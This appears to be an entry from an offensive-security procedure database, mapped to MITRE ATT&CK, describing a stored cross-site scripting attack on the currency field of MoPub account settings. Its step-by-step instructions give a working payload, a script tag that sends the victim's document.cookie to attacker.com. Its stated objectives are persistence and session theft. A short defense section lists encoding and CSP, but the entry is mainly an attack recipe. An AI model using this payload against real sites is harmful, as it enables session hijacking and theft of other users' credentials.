---
id: d4e5f6g7-h8i9-0123-defg-456789012345
tags:
  - xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:06.319Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Script-into-Currency-Field

## Summary

This procedure injects a malicious JavaScript payload into the currency field of MoPub account settings, exploiting stored XSS to execute on victim views.

## Description

The currency field in MoPub lacks input sanitization, allowing storage of scripts that render when other users view account-related pages. In this attack, an authenticated user injects a payload like a script tag stealing cookies. Prerequisites include an active session on the settings page. Outcomes enable session hijacking upon victim interaction.

## Requirements

1. Authenticated access to account settings
2. Knowledge of XSS payloads (e.g., cookie exfiltration)
3. Web browser developer tools for testing

## Defense

Defensive measures and detection strategies:

- Sanitize all inputs with HTML entity encoding
- Implement Content Security Policy (CSP) to block inline scripts
- Monitor for anomalous script content in stored data

## Objectives

1. Store malicious script in currency field
2. Ensure persistence for victim execution
3. Facilitate session theft

## Instructions

### Step 1: Locate Currency Field

**Context**: Identify the vulnerable input on the settings page.

Scroll to the currency selection or input field.

**Expected Output**: Text input or dropdown for currency appears.

### Step 2: Enter Payload

**Context**: Inject the XSS payload to test and exploit.

Type `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>` into the field and save.

**Expected Output**: Changes saved; field retains payload on reload.

**Success Indicators**:
- No validation errors
- Payload renders as text initially but executes on other views

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- stored-xss
- javascript-injection
